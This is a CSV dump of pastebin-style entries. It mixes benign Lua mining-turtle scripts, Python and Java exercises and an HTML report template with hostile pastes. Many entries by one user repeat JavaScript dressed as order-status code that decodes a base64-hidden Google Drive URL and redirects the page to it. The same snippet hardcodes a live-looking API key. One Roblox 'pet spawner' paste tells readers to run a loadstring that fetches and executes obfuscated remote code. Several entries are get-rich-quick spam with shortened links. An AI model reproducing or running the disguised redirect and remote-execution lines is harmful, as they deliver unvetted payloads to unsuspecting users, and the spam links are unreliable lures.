id,title,username,language,date,content
VJBt03m9,Products.js,WantingTrae,JavaScript,Sunday 13th of April 2025 12:53:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MWB3Ym1K,Make $1000 15-MINUTES (BEGINNER) FM,rmpjo3123456,JavaScript,Sunday 13th of April 2025 12:52:55 PM CDT," 
Pdf https://tinyurl.com/privguidee


MtP9jkyVeS
"
CqYK6e8a,–ó–∞–¥–∞—á–∞ 1,dmemsm,Python,Sunday 13th of April 2025 12:48:07 PM CDT,"x, b = map(int, input().split())

t = x / b

if t == 0 or t == 1 or t == 2:
    print(""sin = 0"")
elif 0 < t < 1:
    print(""sin > 0"")
else:
    print(""sin < 0"")

if t == 0.5 or t == 1.5:
    print(""cos = 0"")
elif 0.5 < t < 1.5:
    print(""cos < 0"")
else:
    print(""cos > 0"")"
Cw9K4mfG,Spiral,Flache1,Lua,Sunday 13th of April 2025 12:47:48 PM CDT,"--range in blocks
range = 32

function failsafe()
  turtle.turnLeft()
  while turtle.forward()==false do
    turtle.dig()
  end
  while turtle.up()==false do
    turtle.digUp()
  end
  while turtle.up()==false do
    turtle.digUp()
  end
  while turtle.back()==false do
    turtle.turnRight()
    turtle.turnRight()
    turtle.dig()
    turtle.turnRight()
    turtle.turnRight()
  end
  turtle.turnRight()
  os.shutdown()
end
    
function getitem()
  for z=1,16 do
    turtle.select(z)
    if turtle.getItemCount()>0 then
      break
    end
  end
  if turtle.getItemCount()>=1 then
    return true
  else 
    return false
  end
end

--place the turtle down under the ground:
turtle.turnLeft()
while turtle.forward()==false do
  turtle.dig()
end
while turtle.down()==false do
  turtle.digDown()
end
while turtle.down()==false do
  turtle.digDown()
end
while turtle.back()==false do
  turtle.turnRight()
  turtle.turnRight()
  turtle.dig()
  turtle.turnRight()
  turtle.turnRight()
end
turtle.turnRight()

starty=8+0.25
for i=1,range*4 do
  for i=1,starty do
    if turtle.forward()==false then
      failsafe()
    end
    if turtle.getItemCount()<=0 then
      if getitem()==false then
        failsafe()
      end
    end
    if turtle.detectUp()==false and turtle.placeUp()==false then
      failsafe()
    end 
  end
  starty=starty+0.50
  turtle.turnRight()
end

failsafe()"
BTHx1Ptw,EARN $900 INSTANTLY 2025‚≠ê G8,rmpjo3123456,JavaScript,Sunday 13th of April 2025 12:39:31 PM CDT," 
Pdf https://tinyurl.com/privguidee


VwRezfaHrI
"
A1Du9pH1,Order.js,WantingTrae,JavaScript,Sunday 13th of April 2025 12:38:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02624/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X4eNTea9,Make $1000 15-MINUTES (BEGINNER) FM,Nabeel10,JavaScript,Sunday 13th of April 2025 12:26:03 PM CDT," 
Pdf https://tinyurl.com/privguidee


wQXFYifCC3
"
PT3b2Q4y,Market.js,WantingTrae,JavaScript,Sunday 13th of April 2025 12:23:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62309/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XsTZwasH,casualstockfarm,testbennbon,Lua,Sunday 13th of April 2025 12:22:30 PM CDT,
cT1pJbB8,EARN $900 INSTANTLY 2025‚≠ê G8,Nabeel10,JavaScript,Sunday 13th of April 2025 12:12:39 PM CDT," 
Pdf https://tinyurl.com/privguidee


3ArZtInS6J
"
N8nKwwyV,Untitled,WantingTrae,JavaScript,Sunday 13th of April 2025 12:07:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84124/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NyHfS3zf,10.YA,miglss,Python,Sunday 13th of April 2025 12:02:13 PM CDT,"from collections import defaultdict

def solution(strs: list) -> list:
    anagrams = defaultdict(list)
    
    for s in strs:
        key = """".join(sorted(s))
        anagrams[key].append(s)
    
    return list(anagrams.values())"
qZQ7vYLB,Untitled,Friendsincode,Lua,Sunday 13th of April 2025 11:57:01 AM CDT,"-- üê¢ Smart Strip Miner: Mines 3-high, Snakes, Tracks Fuel + Inventory
-- Chest behind turtle. Coal in slot 16.

-- === Interactive Setup ===
print(""üìê Set up your mining area:"")
write(""Enter width (X axis): "") width = tonumber(read())
write(""Enter length (Z axis): "") length = tonumber(read())
write(""Enter total depth to mine downward (in blocks): "") totalDepth = tonumber(read())

if not width or not length or not totalDepth then
  error(""‚ùå Invalid input. Please enter numbers only."")
end

local layers = math.floor(totalDepth / 3)

-- === State ===
local x, y, z = 0, 0, 0
local dir = 0 -- 0=N, 1=E, 2=S, 3=W

-- === Fuel Logic ===
function fillFuelTank()
  local maxFuel = turtle.getFuelLimit()
  local currentFuel = turtle.getFuelLevel()
  local needed = maxFuel - currentFuel

  turtle.select(16)
  local coalCount = turtle.getItemCount(16)
  local perCoal = 80
  local coalToUse = math.min(math.ceil(needed / perCoal), coalCount)

  if coalToUse > 0 then
    print(""‚õΩ Filling fuel with ""..coalToUse.."" coal..."")
    turtle.refuel(coalToUse)
    print(""‚úÖ Fuel: ""..turtle.getFuelLevel()..""/""..maxFuel)
  else
    error(""‚ùå No coal in slot 16."")
  end
end

function calculateFuelTo(xT, yT, zT)
  return math.abs(x - xT) + math.abs(y - yT) + math.abs(z - zT)
end

function ensureFuel(required)
  if turtle.getFuelLevel() < required then
    turtle.select(16)
    if not turtle.refuel(1) then
      print(""‚õΩ Insert coal in slot 16 to continue..."")
      while not turtle.refuel(1) do sleep(5) end
    end
    print(""‚úÖ Refueled to ""..turtle.getFuelLevel())
  end
end

-- === Position & Direction ===
function updatePosition(move)
  if move == ""forward"" then
    if dir == 0 then z = z - 1 elseif dir == 1 then x = x + 1
    elseif dir == 2 then z = z + 1 elseif dir == 3 then x = x - 1 end
  elseif move == ""back"" then
    if dir == 0 then z = z + 1 elseif dir == 1 then x = x - 1
    elseif dir == 2 then z = z - 1 elseif dir == 3 then x = x + 1 end
  elseif move == ""down"" then y = y - 1
  elseif move == ""up"" then y = y + 1 end
end

function turnLeft() dir = (dir - 1) % 4; turtle.turnLeft() end
function turnRight() dir = (dir + 1) % 4; turtle.turnRight() end
function face(targetDir) while dir ~= targetDir do turnRight() end end

-- === Movement ===
function smartForward()
  ensureFuel(1)
  while not turtle.forward() do
    turtle.dig()
    sleep(0.3)
  end
  updatePosition(""forward"")
end

function smartDown()
  ensureFuel(1)
  while not turtle.down() do
    turtle.digDown()
    sleep(0.3)
  end
  updatePosition(""down"")
end

function smartUp()
  ensureFuel(1)
  while not turtle.up() do
    turtle.digUp()
    sleep(0.3)
  end
  updatePosition(""up"")
end

function descendThree()
  for i = 1, 3 do smartDown() end
end

-- === Dig Helper ===
function dig3Column()
  turtle.digUp()
  turtle.dig()
  turtle.digDown()
end

-- === Inventory ===
function isInventoryFull()
  for i = 1, 15 do if turtle.getItemCount(i) == 0 then return false end end
  return true
end

function dumpInventory()
  for i = 1, 15 do
    turtle.select(i)
    turtle.drop()
  end
end

-- === Navigation ===
function goTo(xT, yT, zT)
  while y > yT do smartDown() end
  while y < yT do smartUp() end
  if x > xT then face(3) elseif x < xT then face(1) end
  while x ~= xT do smartForward() end
  if z > zT then face(0) elseif z < zT then face(2) end
  while z ~= zT do smartForward() end
end

-- === MAIN ===
fillFuelTank()

for layer = 1, layers do
  print(""‚õèÔ∏è Mining layer ""..layer.."" at Y=""..y)

  for row = 1, width do
    for col = 1, length - 1 do
      dig3Column()

      if turtle.getFuelLevel() < calculateFuelTo(0, 0, 0) + 10 then
        print(""‚ö†Ô∏è Returning to refuel."")
        local sx, sy, sz, sd = x, y, z, dir
        goTo(0, 0, 0)
        face(2)
        dumpInventory()
        ensureFuel(calculateFuelTo(sx, sy, sz))
        goTo(sx, sy, sz)
        face(sd)
      end

      if isInventoryFull() then
        print(""üì¶ Inventory full. Returning."")
        local sx, sy, sz, sd = x, y, z, dir
        goTo(0, 0, 0)
        face(2)
        dumpInventory()
        goTo(sx, sy, sz)
        face(sd)
      end

      smartForward()
    end

    -- Snake turn
    if row < width then
      local turnFunc = row % 2 == 1 and turnRight or turnLeft
      turnFunc(); smartForward(); dig3Column(); turnFunc()
    end
  end

  -- End-of-layer dump and descend
  goTo(0, 0, 0)
  local returnDir = dir
  face(2) -- face South to chest
  dumpInventory()
  face(returnDir)

  if layer < layers then descendThree() end
end

print(""‚úÖ Done mining all layers."")
goTo(0, 0, 0)
face(2)
"
yAWm4ePf,Products.js,WantingTrae,JavaScript,Sunday 13th of April 2025 11:52:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25839/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VdiPaGRv,Order.js,WantingTrae,JavaScript,Sunday 13th of April 2025 11:36:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58336/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9a9ud5jb,[NP] Mobile Operator,dzocesrce,Java,Sunday 13th of April 2025 11:30:00 AM CDT,"/**
INPUT:
300 100000 M 210 20 10 2000000 S 400 15 15
31 1002000 S 200 20 12 2000000 S 330 10 15
303 1040000 M 500 24 10 2000000 S 600 25 7
340 1053000 M 200 20 10 2000000 M 320 45 8
OUTPUT:
100000 is not a valid customer ID.
31 is not a valid rep ID.
---- PRINTING FINAL REPORTS FOR SALES REPRESENTATIVES---- 
303 2 2600.00 2150.00 3050.00 272.50
340 2 1190.00 950.00 1430.00 166.60
*/

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.io.*;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;

abstract class Customer implements Comparable<Customer>{
    private long customerID;
    private double minutes;
    private int SMSs;
    private double GBs;

    public Customer(long customerID, double minutes, int SMSs, double GBs) {
        this.customerID= customerID;
        this.minutes = minutes;
        this.SMSs = SMSs;
        this.GBs = GBs;
    }

    public long getCustomerID() {
        return customerID;
    }

    public double getMinutes() {
        return minutes;
    }

    public int getSMSs() {
        return SMSs;
    }

    public double getGBs() {
        return GBs;
    }

    public abstract double totalComission();

    public abstract double totalPrice();

    @Override
    public String toString() {
        return ""Customer{"" +
                ""customerID="" + customerID +
                "", minutes="" + minutes +
                "", SMSs="" + SMSs +
                "", GBs="" + GBs +
                '}';
    }
}

class SCustomer extends Customer{
    public static double COMISSION_RATE_S=0.04;

    public static int FREE_MINUTES_S=100;
    public static int FREE_SMSs_S=50;
    public static int FREE_GBs_S=5;
    public static int BASE_PRICE_S=500;

    public static int MINUTE_PENALTY_S=5;
    public static int SMS_PENALTY_S=6;
    public static int GB_PENALTY_S=25;

    public SCustomer(long customerID, double minutes, int SMSs, double GBs) {
        super(customerID, minutes, SMSs, GBs);
    }

    @Override
    public double totalComission() {
        return totalPrice()*COMISSION_RATE_S;
    }

    @Override
    public double totalPrice() {
        return BASE_PRICE_S+Math.max(0,super.getMinutes()-FREE_MINUTES_S)*MINUTE_PENALTY_S+
                Math.max(0,super.getSMSs()-FREE_SMSs_S)*SMS_PENALTY_S+
                Math.max(0,super.getGBs()-FREE_GBs_S)*GB_PENALTY_S;
    }

    @Override
    public int compareTo(Customer o) {
        return Double.compare(this.totalPrice(),o.totalPrice());
    }
}

class MCustomer extends Customer{
    public static double COMISSION_RATE_M=0.07;

    public static int FREE_MINUTES_M=150;
    public static int FREE_SMSs_M=60;
    public static int FREE_GBs_M=10;
    public static int BASE_PRICE_M=750;

    public static int MINUTE_PENALTY_M=4;
    public static int SMS_PENALTY_M=4;
    public static int GB_PENALTY_M=20;

    public MCustomer(long customerID, double minutes, int SMSs, double GBs) {
        super(customerID, minutes, SMSs, GBs);
    }

    @Override
    public double totalComission() {
        return totalPrice()*COMISSION_RATE_M;
    }

    @Override
    public double totalPrice() {
        return BASE_PRICE_M+Math.max(0,super.getMinutes()-FREE_MINUTES_M)*MINUTE_PENALTY_M+
                Math.max(0,super.getSMSs()-FREE_SMSs_M)*SMS_PENALTY_M+
                Math.max(0,super.getGBs()-FREE_GBs_M)*GB_PENALTY_M;
    }

    @Override
    public int compareTo(Customer o) {
        return Double.compare(this.totalPrice(),o.totalPrice());
    }
}

class MobileOperator {
    List<SalesRep> salesReps;

    public MobileOperator() {
    }

    public void readSalesRepData(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));

        salesReps = bufferedReader.lines()
                .map(i-> {
                    try {
                        return SalesRep.create(i);
                    } catch (InvalidIdException e) {
                        System.out.println(e.getMessage());
                        return null;
                    }
                })
                .filter(Objects::nonNull)
                .collect(Collectors.toList());
    }

    public void printSalesReport(PrintStream out) {

        PrintWriter printWriter = new PrintWriter(out);
        salesReps.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));
        printWriter.flush();
    }
}

class InvalidIdException extends Exception{
    public InvalidIdException(String message) {
        super(message);
    }
}

class SalesRep implements Comparable<SalesRep>{
    private String salesID;
    private List<Customer> customers;

    public SalesRep(String salesID,List<Customer> customers) {
        this.salesID = salesID;
        this.customers= customers;
    }

    public static boolean checkValidSalesId(String s) throws InvalidIdException {
        if(s.length()!=3)
            throw new InvalidIdException(String.format(""%s is not a valid rep ID."",s));
        for(char c : s.toCharArray()){
            if(!Character.isDigit(c))
                throw new InvalidIdException(String.format(""%s is not a valid rep ID."",s));
        }
        return true;
    }

    public static boolean checkValidCustomerId(Long l) throws InvalidIdException {
        if(l<1000000 || l>9999999)
            throw new InvalidIdException(String.format(""%d is not a valid customer ID."",l));
        return true;
    }

    public static SalesRep create(String s) throws InvalidIdException {

        String[] parts = s.split(""\\s+"");
        String salesID= parts[0];
        List<Customer> customers = new ArrayList<>();
        if(!checkValidSalesId(salesID))
            throw new InvalidIdException(String.format(""%s is not a valid rep ID."",salesID));
        for(int i=1;i< parts.length;i+=5){

            Long customerID= Long.parseLong(parts[i]);
            String type = parts[i+1];
            double minutes = Double.parseDouble(parts[i+2]);
            int SMSs = Integer.parseInt(parts[i+3]);
            double GBs = Double.parseDouble(parts[i+4]);
            if(!checkValidCustomerId(customerID))
                throw new InvalidIdException(String.format(""%d is not a valid customer ID."",customerID));
            if(type.equals(""M""))
                customers.add(new MCustomer(customerID,minutes,SMSs,GBs));
            else
                customers.add(new SCustomer(customerID,minutes,SMSs,GBs));
        }
        return new SalesRep(salesID,customers);
    }

    public int numberOfBills(){
        return customers.size();
    }

    public double minBill(){
        return customers.stream().max(Comparator.reverseOrder()).get().totalPrice();
    }

    public double maxBill(){
        return customers.stream().min(Comparator.reverseOrder()).get().totalPrice();
    }

    public double averageBill(){
        return customers.stream().mapToDouble(i->i.totalPrice()).sum()/numberOfBills();
    }

    public double totalComissionOfCustomers(){
        return customers.stream().mapToDouble(i->i.totalComission()).sum();
    }

    @Override
    public String toString() {
        return String.format(""%s %d %.2f %.2f %.2f %.2f"",salesID,numberOfBills(),averageBill(),minBill(),maxBill(),totalComissionOfCustomers());

    }


    @Override
    public int compareTo(SalesRep o) {
        return Double.compare(this.totalComissionOfCustomers(),o.totalComissionOfCustomers());
    }
}

public class MobileOperatorTest {
    public static void main(String[] args) {

        MobileOperator mobileOperator = new MobileOperator();
        System.out.println(""--- READINGOF THE SALES REPORTS ----"");
        mobileOperator.readSalesRepData(System.in);
        System.out.println(""---- PRINTING FINAL REPORTS FOR SALES REPRESENTATIVES---- "");
        mobileOperator.printSalesReport(System.out);
    }
}
"
ShcPErrH,Market.js,WantingTrae,JavaScript,Sunday 13th of April 2025 11:20:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45716/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X94p0jmC,4x4 tunnel downwards computercraft turtle,FloatingEye,Lua,Sunday 13th of April 2025 11:17:03 AM CDT,"function forward()
    if (turtle.forward() == false) then
        if (turtle.refuel() == false) then
            val = false
        end
    end
end
val = true
while (val == true) do
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnLeft()

    forward()
    turtle.digDown()

    turtle.turnLeft()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()

    turtle.turnRight()

    forward()
    turtle.digDown()
    forward()
    turtle.digDown()
    forward()
    turtle.turnRight()
    turtle.down()
end
"
pV7EYubE,Untitled,pastexale,HTML,Sunday 13th of April 2025 11:13:14 AM CDT,"<!DOCTYPE html>
<html lang=""it"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>{{ report_title }}</title>
    <style>
        body { font-family: sans-serif; line-height: 1.6; margin: 20px; }
        h1, h2, h3 { color: #333; }
        h2 { border-bottom: 1px solid #ccc; padding-bottom: 5px; margin-top: 30px; }
        h3 { margin-top: 25px; color: #555; }
        .report-header p { margin: 2px 0; color: #666; font-size: 0.9em; }
        /* Stile tabella da Pandas to_html (assicurati classi corrispondano) */
        .table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        .table th, .table td { border: 1px solid #ddd; padding: 8px; text-align: right; }
        .table th { background-color: #f2f2f2; text-align: center; }
        .table-striped tbody tr:nth-of-type(odd) { background-color: #f9f9f9; }
        .table-hover tbody tr:hover { background-color: #f1f1f1; }
        .table-sm td, .table-sm th { padding: .3rem; }
        /* Centra nome evento nell'indice tabella */
        .table thead th:first-child { text-align: left; }
        .table tbody th { text-align: left; }
        /* Stile per i div dei grafici */
        .plotly-graph-div { margin-bottom: 30px; }
    </style>
    <script src='https://cdn.plot.ly/plotly-latest.min.js'></script>
</head>
<body>

    <h1>{{ report_title }}</h1>
    <div class=""report-header"">
        <p><strong>ETF Analizzato:</strong> {{ etf_ticker }}</p>
        <p><strong>Benchmark:</strong> {{ benchmark_ticker }}</p>
        <p><strong>Generato il:</strong> {{ generation_date }}</p>
    </div>

    <h2>Riepilogo Metriche per Evento</h2>
    <div>
        {{ summary_table_html | safe }} {# Il filtro 'safe' √® essenziale #}
    </div>
    
    {# --- NUOVA SEZIONE VALUTAZIONE --- #}
    {% if evaluation_html %} {# Passato da main.py nel context #}
    <div class=""evaluation-section"">
        {{ evaluation_html | safe }} {# Stampa l'HTML generato da get_evaluation_summary_html #}
    </div>
    {% endif %}
    {# --- FINE SEZIONE VALUTAZIONE --- #}


    <h2>Grafici Aggregati</h2>
    {% if aggregate_plots %}
        {% for metric_name, plot_html in aggregate_plots.items() %}
            <div class=""plotly-graph-div"">
                {{ plot_html | safe }}
            </div>
        {% endfor %}
    {% else %}
        <p>Nessun grafico aggregato disponibile.</p>
    {% endif %}

    <h2>Grafici per Evento Individuale</h2>
    {% if event_plots %}
         {% for event_plot_data in event_plots %}
            <h3>{{ event_plot_data.name }}</h3>
            <div class=""plotly-graph-div"">
                {{ event_plot_data.plot_html | safe }}
            </div>
         {% endfor %}
    {% else %}
        <p>Nessun grafico per evento disponibile.</p>
    {% endif %}

</body>
</html>"
ngB3KeR7,Untitled,WantingTrae,JavaScript,Sunday 13th of April 2025 11:05:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13799/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8YvLU761,Products.js,WantingTrae,JavaScript,Sunday 13th of April 2025 10:50:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42991/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MRxttJVd,Adopt Me! üå∏ [Pet  SPAWNER!],ScriptSensical,C++,Sunday 13th of April 2025 10:39:49 AM CDT,"This PasteBin has been updated for new Adopt Me Update! üå∏ - Update date 2025-04-13 17:00 pm 

üíª Script: (Used in the video )
loadstring(game:HttpGet('https://raw.githubusercontent.com/BludnyHolandan/AdoptMePets/refs/heads/main/obf/script.lua'))()
--{By Vofflann}--
 
üìù Updates:   (LAST UPDATE : 2025-04-13 Adopt Me! [FESTIVALüå∏])

üî• ùó°ùóºùòÅùó∂ùó∞ùó≤ üî•
Using third-party scripts in games may violate the games terms of service and could result in consequences for your account. Use scripts responsibly and at your own risk. Im not responsible for any accounts loss.

NOTE : Wait around 5 seconds before executing the script to fully load the game. Otherwise it will crash."
s3E6DB9s,Order.js,WantingTrae,JavaScript,Sunday 13th of April 2025 10:34:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98058/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
